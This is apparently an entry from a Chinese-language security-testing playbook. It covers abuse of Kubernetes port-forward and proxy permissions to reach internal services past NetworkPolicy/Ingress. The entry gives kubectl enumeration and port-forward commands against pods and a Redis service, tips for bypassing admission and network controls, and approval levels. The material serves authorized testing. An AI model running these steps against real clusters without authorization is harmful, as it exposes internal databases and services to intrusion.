---
source: manual
confidence: high
platforms: [k8s]
required_tools: []
execution_contexts: [L0, L1, L2]
max_verification_level: L2
destructive: false
mapped_attack_surfaces: [AS-3.5]
mapped_compliance_families: [RBAC配置, 网络策略]
---

# k8s-proxy-abuse — K8s Node Proxy / Port-Forward 滥用

攻击者拥有 `pods/portforward` 或 `proxy` 权限的 ServiceAccount 或用户，可将集群内部服务通过 port-forward 或 proxy 暴露到本地，绕过 NetworkPolicy/Ingress 限制访问内部敏感服务。

---

## 1. 前置条件

- 当前 SA 或用户拥有 `pods/portforward` 或 `proxy` 权限
- 目标 Pod 或 Service 存在且监听内部端口
- 本地可发起 kubectl port-forward 进程

检查命令：
```bash
# [L0] 检查当前身份是否有 pods/portforward 权限
kubectl auth can-i create pods/portforward
# 期望输出: yes

# [L0] 检查是否有 proxy 权限
kubectl auth can-i get --proxy
# 期望输出: yes
```

## 2. 探测命令

```bash
# [L0] 确认当前权限全集
kubectl auth can-i --list 2>/dev/null | grep -E 'portforward|proxy'
# 期望输出: create pods/portforward yes

# [L0] 枚举可 port-forward 的目标 Pod 及内部端口
kubectl get pods --all-namespaces -o json | jq '.items[] | {name: .metadata.name, ns: .metadata.namespace, ports: [.spec.containers[].ports[].containerPort]}'
# 期望输出: 每个暴露的 Pod 及其 containerPort

# [L0] 枚举内部 Service
kubectl get svc --all-namespaces -o wide
# 期望输出: 全集群 Service 列表
```

## 3. 攻击验证

```bash
# [L2] 将内部服务 port-forward 到本地
kubectl port-forward -n <target-ns> pod/<target-pod> 8080:80 &
# 期望输出: Forwarding from 127.0.0.1:8080 -> 80

# [L2] 通过本地端口访问内部服务（绕过 NetworkPolicy/Ingress）
curl -s http://127.0.0.1:8080/
# 期望输出: 内部服务响应内容

# [L2] 暴露数据库类服务到本地
kubectl port-forward -n <target-ns> svc/<redis-svc> 6379:6379 &
redis-cli -h 127.0.0.1 -p 6379 INFO
# 期望输出: Redis 内部信息（证明可访问内部数据库服务）
```

## 4. 差分证明

```bash
# [L0] 攻击前：本地端口监听状态
ss -tlnp | grep -E '8080|6379'
# 期望输出: 无监听（端口空闲）

# [L2] port-forward 后：本地端口可访问内部服务
ss -tlnp | grep -E '8080|6379'
# 期望输出: 127.0.0.1:8080 LISTEN（port-forward 进程监听）

# [L2] 访问内部服务响应
curl -s http://127.0.0.1:8080/
# 期望输出: 内部服务响应 → 证明内部服务已暴露到本地
```

差分结论：攻击前本地 8080/6379 端口无监听，攻击后通过 port-forward 成功将集群内部服务暴露到本地并访问，证明 `portforward` 权限可绕过 NetworkPolicy/Ingress 边界。

## 5. 绕过策略

```bash
# [L1] 检查 NetworkPolicy 是否限制 port-forward 目标
kubectl get networkpolicy -A -o yaml | grep -A5 -i port
# 若输出含 egress/ingress 规则 → 可能限制可转发端口范围

# [L1] 检查是否存在 AdmissionController 限制 port-forward
kubectl get validatingwebhookconfiguration -o json | jq '.items[].webhooks[].rules[] | select(.resources[] | test("portforward"))'
# 若输出含 portforward 规则 → 可能被准入控制拦截

# 绕过方式：
# - [L1] 若 NetworkPolicy 限制目标 Pod，枚举未限制命名空间的 Pod
# - [L2] 若 port-forward 需要特定 Pod 状态，使用 svc/port-forward 代替
# - [L2] 若仅 pods/portforward 可用但需访问 Service，先找出 Service 后端 Pod 直接转发
```

## 6. 证伪条件

```bash
# [L0] 无 portforward / proxy 权限
kubectl auth can-i create pods/portforward
kubectl auth can-i get --proxy
# 输出: no 且 no → 证伪

# [L1] 目标 Pod/Service 不存在
kubectl get pod -n <target-ns> <target-pod> 2>&1
# 输出: NotFound → 证伪

# [L1] 内部服务未监听任何端口
kubectl get pod -n <target-ns> <target-pod> -o json | jq '.spec.containers[].ports'
# 输出: null → 证伪（无可转发端口）
```

## 7. 审批级别

- **L2** port-forward 攻击验证（暴露内部服务到本地）→ **Level 3**（非破坏性端口转发验证，需人工确认）
- **L1** 探测命令 → **Level 2**（只读探测，自动执行）
- **L0** 宿主机观察命令 → **Level 1**（只读侦察，自动执行）
- 破坏性标注：否
- 最高验证层级：L2

## 8. MITRE ATT&CK

- **Tactic**: Lateral Movement / Command and Control
- **Technique ID**: T1021
- **Technique Name**: Remote Services
- **描述**: 攻击者利用 K8s `pods/portforward` 或 `proxy` 权限将集群内部服务隧道到本地，绕过 NetworkPolicy/Ingress 边界访问内部数据库、API 等敏感服务，实现横向移动与数据窃取。